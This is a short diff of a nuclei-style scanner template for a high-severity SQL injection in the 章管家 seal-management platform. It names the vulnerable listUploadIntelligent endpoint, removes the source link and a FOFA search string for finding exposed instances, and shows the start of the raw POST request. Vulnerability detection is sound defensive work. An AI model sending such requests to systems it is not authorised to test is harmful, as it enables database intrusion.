@@ -3,12 +3,8 @@ info:
   name: 章管家-listUploadIntelligent-sql注入漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/ttq82ydxn203lbd8'
+  description: ''
   tags: sqli,file-upload,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: ttq82ydxn203lbd8
-    fofa: app="章管家-印章智慧管理平台"
 http:
 - raw:
   - 'POST /app/message/listUploadIntelligent.htm?token=dingtalk_token&person_id=1&unit_id=1 HTTP/1.1
